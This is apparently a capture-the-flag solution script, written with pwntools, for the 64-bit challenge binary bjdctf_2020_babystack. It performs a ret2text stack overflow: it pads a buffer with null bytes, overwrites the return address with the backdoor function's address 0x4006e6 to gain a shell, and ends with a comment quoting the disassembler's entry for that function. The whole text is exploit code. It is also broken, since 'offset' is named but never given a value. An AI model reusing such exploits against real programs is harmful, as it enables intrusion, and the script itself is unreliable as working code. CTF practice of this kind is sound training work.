#Made by fly_autumn
#64位下ret2text

from pwn import *
p = process("./bjdctf_2020_babystack")
offset
back_addr = 0x4006e6
payload = b"\x00" * offset + p64(back_addr)
p.sendline(payload)
p.interactive()

#backdoor	.text	00000000004006E6	00000015	00000008		R	.	.	.	.	.	B	.	.